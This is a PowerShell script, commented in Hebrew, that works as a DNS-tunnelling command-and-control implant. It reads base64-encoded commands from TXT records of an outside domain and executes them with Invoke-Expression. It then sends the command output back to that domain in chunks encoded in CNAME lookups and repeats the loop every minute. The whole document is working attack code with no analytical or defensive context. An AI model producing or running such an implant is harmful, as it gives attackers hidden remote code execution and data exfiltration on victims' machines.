# הגדרת הדומיין לבדיקה
$domain = "command.connect.menorraitdev.net"
$previousTXT = ""

# לולאה לבדיקת פקודות חדשות
while ($true) {
    # ביצוע שאילתת TXT
    $output = nslookup -type=TXT $domain | Out-String

    # חילוץ תוכן רשומת ה-TXT
    if ($output -match 'text\s*=\s*"(.*?)"') {
        $currentTXT = $matches[1]

        # בדיקה אם ה-TXT השתנה (פקודה חדשה)
        if ($currentTXT -ne $previousTXT) {
            Write-Output "Detected new command in TXT record: $currentTXT"
            $previousTXT = $currentTXT

            # פענוח הפקודה מבסיס 64
            $Command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($currentTXT))
            Write-Output "Decoded command: $Command"

            # הרצת הפקודה
            $output = Invoke-Expression $Command
            Write-Output "Command output: $output"

            # בדיקת אורך הפלט
            if ($output.Length -gt 63) {
                # אם הפלט ארוך, פיצול לחתיכות עם Chunk
                $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
                $chunks = ($encodedOutput -split '(.{63})' | Where-Object { $_ -ne "" })
                $counter = 1

                foreach ($chunk in $chunks) {
                    # הגדרת CNAME עם מספר חתיכה בפורמט Chunk
                    $subdomain = "Chunk$counter.$chunk.$domain"
                    nslookup -type=CNAME $subdomain
                    Start-Sleep -Milliseconds 500  # השהייה בין שליחת חתיכות
                    $counter++
                }
            } else {
                # אם הפלט קצר, הוספת מספר רנדומלי ושליחת הפלט כחתיכה יחידה
                $randomNumber = Get-Random -Minimum 100 -Maximum 999
                $modifiedOutput = "$output$randomNumber"
                $encodedOutput = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($modifiedOutput))
                
                nslookup -type=CNAME "$encodedOutput.$domain"
            }

            Write-Output "Sent encoded output. Waiting for new command..."
        } else {
            Write-Output "No new command detected."
        }
    } else {
        Write-Output "TXT record not found."
    }

    # השהייה של דקה לפני בדיקה נוספת
    Start-Sleep -Seconds 60
}
